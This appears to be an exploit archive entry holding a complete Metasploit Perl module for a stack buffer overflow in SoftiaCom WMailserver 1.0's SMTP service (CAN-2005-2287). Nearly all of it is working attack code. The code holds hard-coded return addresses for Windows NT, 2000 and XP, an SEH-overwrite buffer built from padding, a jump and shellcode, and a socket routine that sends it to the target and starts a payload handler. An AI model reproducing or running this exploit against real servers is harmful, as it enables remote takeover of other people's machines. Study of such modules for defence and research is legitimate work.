SoftiaCom WMailserver 1.0 SMTP Remote Buffer Overflow Exploit (meta)
====================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wmailserver_smtp;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	&#039;Name&#039;     => &#039;SoftiaCom WMailserver 1.0 SMTP Buffer Overflow&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.1 $&#039;,
	&#039;Authors&#039;  => [ &#039;y0 [at] w00t-shell.net&#039;, ],
	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039;, &#039;winnt&#039;, &#039;win2000&#039;, &#039;winxp&#039; ],
	&#039;Priv&#039;  => 0,
	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 25],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },
	&#039;AutoOpts&#039; => { &#039;EXITFUNC&#039; => &#039;thread&#039; },
	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;     => 600,
		&#039;BadChars&#039;  => "\x00\x0a\x0d\x20:=+\x22",
		&#039;Prepend&#039;   => "\x81\xc4\xff\xef\xff\xff\x44",
		&#039;Keys&#039;      => [&#039;+ws2ord&#039;],
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
	This module exploits a stack overflow in SoftiaCom WMailserver 1.0 (SMTP)
	via a SEH frame overwrite.
}),

	&#039;Refs&#039;  =>
	  [
		[&#039;CVE&#039;, &#039;CAN-2005-2287&#039;],
		[&#039;BID&#039;, &#039;14213&#039;],
	  ],
	&#039;Targets&#039; =>
	  [
		[&#039;Windows NT 4.0 English SP4/SP5/SP6&#039;, 0x776a1799],
		[&#039;Windows 2000 English ALL&#039;, 0x75022ac4],
		[&#039;Windows XP English SP0/SP1&#039;, 0x71aa32ad],
	  ],
	&#039;Keys&#039; => [&#039;smtp&#039;],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $splat  = Pex::Text::UpperCaseText(5117);

	my $sploit =
	  " ". $splat. "\xeb\x06". pack(&#039;V&#039;, $target->[1]).
	  $shellcode. "\r\n\r\n";

	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}

1;


